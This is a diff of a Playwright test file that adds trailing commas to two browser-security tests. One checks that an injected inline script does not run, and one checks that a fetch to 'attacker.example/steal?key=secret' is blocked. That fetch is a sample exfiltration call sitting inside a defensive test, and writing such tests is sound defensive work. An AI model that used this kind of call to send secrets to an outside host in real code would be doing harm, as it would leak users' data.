@@ -38,9 +38,9 @@ test("an injected inline script does not run", async ({ page }) => {
         document.body.appendChild(div);
         setTimeout(
           () => resolve({ ran: Boolean((window as { __pwned?: boolean }).__pwned), blocked }),
-          1000
+          1000,
         );
-      })
+      }),
   );
 
   expect(result.ran).toBe(false);
@@ -58,8 +58,8 @@ test("the page cannot send data to an unknown host", async ({ page }) => {
   const outcome = await page.evaluate(() =>
     fetch("https://attacker.example/steal?key=secret").then(
       () => "sent",
-      () => "blocked"
-    )
+      () => "blocked",
+    ),
   );
 
   expect(outcome).toBe("blocked");
